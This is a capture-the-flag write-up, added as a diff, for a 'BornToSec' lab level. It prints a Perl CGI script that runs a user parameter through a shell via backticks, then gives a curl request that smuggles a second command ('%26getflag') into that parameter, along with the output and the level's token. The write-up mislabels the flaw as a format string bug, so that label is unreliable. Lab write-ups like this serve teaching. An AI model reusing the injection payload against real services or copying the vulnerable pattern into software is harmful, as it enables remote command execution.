@@ -1,0 +1,44 @@
+# cat README i choose the second part
+```
+...
+You can try to understand this little regex and there is a chance to have this flag..
+/!\ If you try to run it make sure you understand all this code ..:)/!\
+Or just exploit this single small script on this folder.
+This script run on port : 4747.
+```
+
+# cat level05.pl
+```
+level05@BornToSec:~$ cat level05.pl
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ft_cmd {
+  $xd = $_[0];
+  print("<html><head><title>Echo results</title></head><body><pre>");
+  print `echo $xd 2>&1`;
+  print("</pre></body></html>");
+}
+ft_cmd(param("ft_cmd"));
+```
+
+# same format string bug like level03
+```
+print `echo $xd 2>&1`;
+```
+
+# just need to encode &(%26) and curl the page
+```
+curl 'http://172.16.113.132:4747/?ft_cmd=toto%26getflag'
+```
+
+# result
+```
+level05@BornToSec:~$ curl 'http://172.16.113.132:4747/?ft_cmd=toto%26getflag'
+<html><head><title>Echo results</title></head><body><pre>Check flag.Here is your token : viuaaale9huek52boumoomioc
+toto
+</pre></body></html>level05@BornToSec:~$
+```
